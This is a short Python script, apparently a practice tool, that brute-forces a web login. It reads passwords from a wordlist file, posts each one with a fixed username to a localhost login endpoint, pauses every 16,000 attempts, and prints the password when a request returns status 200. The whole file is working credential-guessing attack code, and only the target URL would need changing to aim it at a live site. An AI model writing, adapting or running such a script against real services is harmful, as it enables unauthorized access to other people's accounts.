import requests
import time
import sys
from termcolor import colored, cprint

url = "http://localhost:5000/postpassword"
username = "hello@gmail.com"
error = "Error message"


def bruteCracking(username, url, error):
    count = 0
    for password in passwords:
        password = password.strip()
        count = count + 1
        # print("Trying Password: " + str(count) + ' Time For => ' + password)
        if(count == 16000):
            time.sleep(1)
            count = 0
        data_dict = {"username": username,
                     "password": password}
        response = requests.post(url, data_dict)
        # print(response)
        if(int(response.status_code) == 200):
            text = "request to host: http://localhost:5000/" + \
                " username: " + username + " password: " + password + \
                " response status "+str(response.status_code)
            print(colored(text, 'green'))
            exit()
        text = " request to host: http://localhost:5000/ " + \
            " username: " + username + " password: " + password + \
            " response status code is "+str(response.status_code)
        print(count, colored(text, 'red'))
# except:
#     print("Some Error Occurred Please Check Your Internet Connection !!")


with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url, error)

print("[!!] password not in list")
